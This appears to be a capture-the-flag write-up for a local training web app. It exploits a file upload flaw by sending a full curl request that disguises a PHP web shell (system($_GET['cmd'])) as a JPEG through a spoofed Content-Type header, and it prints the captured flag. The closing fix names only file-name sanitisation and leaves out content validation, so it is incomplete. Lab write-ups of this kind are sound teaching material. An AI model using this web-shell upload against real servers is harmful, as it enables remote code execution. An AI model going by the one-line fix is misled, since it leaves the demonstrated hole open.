# Breach Name: File Upload Vulnerability Exploiting Content-Type Manipulation
## Description of the Breach

This breach was identified on the file upload page of the website, where a vulnerability allows unauthorized file types, such as PHP scripts, to be uploaded by manipulating the Content-Type header in the request. By exploiting this vulnerability, we were able to upload a PHP shell script and retrieve the flag.

## Steps to Reproduce

1. Navigate to the File Upload Page:

	Start from the homepage and go to the file upload page:

	```bash
	http://localhost:8080/index.php?page=upload
	```

2. Inspect the Network Request:

	Open the browser's developer tools and go to the "Network" tab. Upload a file (e.g., an image) using the upload form, and observe the POST request that is made to upload the file.

3. Copy the Network Request as cURL:

	Right-click on the network request and select "Copy as cURL". This gives you a cURL command that can be modified for further exploitation.

4. Modify the Content-Type and Payload:

	Modify the copied cURL command to change the Content-Type header to `multipart/form-data` and adjust the payload to include a PHP script as the file content. The modified cURL command is as follows:

	```bash
	curl 'http://localhost:8080/index.php?page=upload' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
	-H 'Accept-Language: en-US,en' \
	-H 'Cache-Control: max-age=0' \
	-H 'Connection: keep-alive' \
	-H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9k7Q1MsUM92jf0F4' \
	-H 'Cookie: csrftoken=6la8Whx71kgYwiu1HUqby8bGHiSkJf2j9rlT80LuniGLvkJzAtbJNOx4EK5rXVKe; sessionid=wkyan96hdzkvna3h6vfkck2lbsci7d30; I_am_admin=68934a3e9455fa72420237eb05902327' \
	-H 'Origin: http://localhost:8080' \
	-H 'Referer: http://localhost:8080/index.php?page=upload' \
	-H 'Sec-Fetch-Dest: document' \
	-H 'Sec-Fetch-Mode: navigate' \
	-H 'Sec-Fetch-Site: same-origin' \
	-H 'Sec-Fetch-User: ?1' \
	-H 'Sec-GPC: 1' \
	-H 'Upgrade-Insecure-Requests: 1' \
	-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' \
	-H 'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"' \
	-H 'sec-ch-ua-mobile: ?0' \
	-H 'sec-ch-ua-platform: "Linux"' \
	--data-raw $'------WebKitFormBoundary9k7Q1MsUM92jf0F4\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n100000\r\n------WebKitFormBoundary9k7Q1MsUM92jf0F4\r\nContent-Disposition: form-data; name="uploaded"; filename="shell.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php system($_GET[\'cmd\']); ?>\r\n------WebKitFormBoundary9k7Q1MsUM92jf0F4\r\nContent-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n------WebKitFormBoundary9k7Q1MsUM92jf0F4--\r\n'
	```

	Explanation: The script above modifies the file upload to pretend that a PHP script (`shell.php`) is an image file by setting the Content-Type to `image/jpeg`. The PHP script contains:

	```php
	<?php system($_GET['cmd']); ?>
	```

5. Execute the cURL Command:

	Run the modified cURL command in your terminal. This command uploads the `shell.php` script to the server.

6. Retrieve the Flag:

	After successfully uploading the script, the server response contains the following message, indicating that the file was uploaded and the flag was revealed:

	```php
	<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/shell.php successfully uploaded.</pre>
	```

	Flag: `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

## Explanation of the Breach

The vulnerability here is a File Upload Vulnerability that allows unauthorized files to be uploaded by manipulating the Content-Type header. The server fails to properly validate the file type and content, allowing us to upload and execute a PHP script, which could lead to remote code execution (RCE).

## How to Fix the Breach

- Sanitize Uploaded File Names:

  Ensure that uploaded file names are sanitized to prevent directory traversal or overwriting important files on the server.

